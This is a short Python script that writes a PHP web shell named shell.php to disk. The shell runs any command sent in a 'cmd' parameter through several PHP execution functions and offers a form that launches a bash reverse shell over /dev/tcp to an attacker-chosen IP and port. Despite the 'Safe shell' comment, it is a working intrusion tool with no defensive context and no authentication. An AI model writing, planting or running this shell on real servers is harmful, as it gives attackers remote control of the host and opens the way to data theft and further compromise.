#!/usr/bin/env python3
import base64
import os

SHELL_CODE = '''<?php
// Safe shell with error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Try multiple command execution methods
function run_cmd($cmd) {
    $output = '';
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $out);
        $output = implode("\\n", $out);
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    }
    return $output ?: 'No output or all functions disabled';
}

$cmd_output = '';
$cmd = $_REQUEST['cmd'] ?? '';
if ($cmd) {
    $cmd_output = run_cmd($cmd);
}
?>
<!DOCTYPE html>
<html>
<head><title>Web Shell</title></head>
<body style="background:#0a0e27;color:#0f0;font-family:monospace;padding:20px;">
<h1>XNG Web Shell</h1>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command" size="60" autofocus>
    <button type="submit">Execute</button>
</form>
<pre><?php echo htmlspecialchars($cmd_output); ?></pre>
<hr>
<form method="POST">
    <h3>Reverse Shell</h3>
    <input type="text" name="rip" placeholder="IP" value="">
    <input type="text" name="rport" placeholder="Port" value="443">
    <button type="submit" name="revshell">Send Reverse Shell</button>
</form>
<?php
if (isset($_POST['revshell'])) {
    $ip = $_POST['rip'];
    $port = $_POST['rport'];
    $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
    run_cmd($cmd . ' > /dev/null 2>&1 &');
    echo "<p>Attempted reverse shell to $ip:$port</p>";
}
?>
</body>
</html>
'''

# Write file without BOM, with Unix line endings
with open('shell.php', 'w', encoding='utf-8', newline='\n') as f:
    f.write(SHELL_CODE)

print("[+] Created: shell.php")

